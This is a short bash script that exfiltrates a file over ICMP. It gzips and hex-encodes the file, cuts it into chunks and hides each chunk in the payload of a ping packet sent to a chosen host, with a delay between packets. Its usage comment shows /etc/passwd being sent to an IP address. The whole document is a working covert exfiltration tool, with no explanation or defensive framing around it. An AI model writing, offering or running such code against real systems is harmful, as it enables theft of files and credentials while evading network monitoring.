#!/bin/bash

waitime=0.05
pingouting(){
    hex_result=`gzip -c ${1}| xxd -p| sed ":a;N;s/\\n//g;ta"`
    hex_length=${#hex_result}   #wc -L
    split_len=28
    chunks_num=$(( ${hex_length} / ${split_len} ))
    chunks_remainder=$(( ${hex_length} % ${split_len} ))
    if [ "$chunks_remainder" -ne "0" ];then
        let chunks_num=chunks_num+1
    fi
 
    i=0
    while [ "${i}" -lt "${chunks_num}" ]
    do
        sleep ${waitime}
        random_str=`head /dev/urandom |md5sum |cut -c 1-9`
        let x=1+${i}*${split_len}
        let y=${split_len}+${i}*${split_len}
        payload=`echo ${hex_result}|cut -c ${x}-${y}`
        echo $payload
        ping -p 3c${payload}3e -c 1 ${2} >/dev/null
        let i=i+1
    done

}

pingouting $1 $2
#./pingouting2.sh /etc/passwd 192.168.0.2